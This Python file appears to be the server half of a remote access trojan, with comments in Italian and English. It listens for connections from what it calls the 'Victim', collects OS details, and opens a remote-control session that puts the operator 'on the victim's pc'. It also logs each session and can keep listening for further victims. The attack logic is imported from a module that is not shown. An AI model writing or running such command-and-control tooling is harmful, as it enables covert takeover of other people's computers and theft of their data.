import signal
import sys
from remoteCommandsServer import *
import wavio as wv

def main(fileLog):
    try:
        signal.signal(signal.SIGINT, signalHandler)
        server = serverConnection()
        if server == "errore":
            #traceback.print_exc()
            raise Exception
        else:
            exit = False
            while exit == False:
                clientConnection, addr = server.accept()
                print(f"[CONNECTED] Established a connection with the Victim using socket: {addr}")
                os.mkdir(f"cartellaClient {addr}")
                os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")

                fileLog = fileLog + "\n" + f"[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"

                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Waiting for OS Info...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)

                buff=""

                # RICEVO INFORMAZIONI SISTEMA OPERATIVO
                try:
                    buff,fileLog= printInformazioni(clientConnection,addr,fileLog)
                except Exception as e:
                    #traceback.print_exc()
                    if e.__class__.__name__ == "ConnectionResetError":
                        print(f"[ERROR] Connessione con client {addr} interrotta!!!\n")
                        fileLog = fileLog + "\n" + f"[ERROR] Connessione con client {addr} interrotta!!!\n"
                        exit = True
                    else:
                        fileLog = fileLog + "\n" + f"[ERROR] Qualcosa nella print informazioni non ha funzionato\n"
                        print(f"[ERROR] Qualcosa nella print informazioni non ha funzionato\n")


                #ATTIVO LA REMOTE CONTROL
                attivo = 1
                while attivo == 1:
                    try:
                        for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                            sleep(0.2)
                        print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
                        fileLog=fileLog+"\n"+ f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n"
                        typeExit, fileLog=remoteControl(clientConnection,buff,fileLog)

                        attivo = 0
                        if typeExit=="[ERROR]":
                            raise Exception
                        elif typeExit=="[ERROR CONNECTION]":
                            raise ConnectionResetError
                        elif typeExit=="[END]":
                            pass

                    except Exception as e:
                        #traceback.print_exc()
                        if e.__class__.__name__ == "ConnectionResetError":
                            print(f"La connessione con il client {addr} si è interrotta\n")
                            fileLog = fileLog + "\n" + f"La connessione con il client {addr} si è interrotta\n" + "\n"
                            attivo = 0
                        else:
                            attivo = 0

                clientConnection.close()
                for i in tqdm(range(10), desc=Fore.LIGHTWHITE_EX + "Chiusura connessione client", colour="green", ncols=50,
                              bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)
                print(f"[CLOSED] Client Connection {addr} closed succesfully!")
                fileLog = fileLog + "\n" + f"[CLOSED] Client Connection {addr} closed succesfully!" + "\n"
                print()

                file = open("fileLogGenerale.txt", "w")
                file.write(fileLog)
                file.close()
                fileLog = ""
                os.chdir("..")

                # Le operazioni sono concluse e decido come procedere
                restartDecision='0'
                while restartDecision!='1' and restartDecision!='2':
                    print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
                    print(f"[DECISION] 1 - Keep Listening")
                    print(f"[DECISION] 2 - Close Server")
                    restartDecision = input("> ")

                if restartDecision == '2':
                    exit = True
                    print(f"[INFO] The Server was shut down successfully")
                    server.close()
                    sys.exit(0)
                elif restartDecision == '1':
                    print(f"[INFO] The server keeps listening...")
                    t_end = time.time() + 3
                    while time.time() < t_end:
                        print(".", end="")
                        time.sleep(1)
                        print(".", end="")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                else:
                    file = open("fileLogGenerale.txt", "w")
                    file.write(fileLog)
                    file.close()
                    fileLog = ""
                    os.chdir("..")
                    clientConnection.close()
                    server.close()

    except Exception as e:
        #traceback.print_exc()
        if e.__class__.__name__ == "ConnectionResetError":
            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            file = open("fileLogGenerale.txt", "w")
            file.write(fileLog)
            file.close()
            fileLog = ""
            raise e
        else:
            file = open("fileLogGenerale.txt", "w")
            file.write(fileLog)
            file.close()
            fileLog = ""
            raise e

if __name__ == "__main__":
    try:
        fileLog = f"###          FILELOG RESULT          ###\n"
        main(fileLog)
    except:
        traceback.print_exc()
        fileLog = ""
        for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Closing Server...", colour="green", ncols=50,
                      bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[CLOSE] Server closed.")


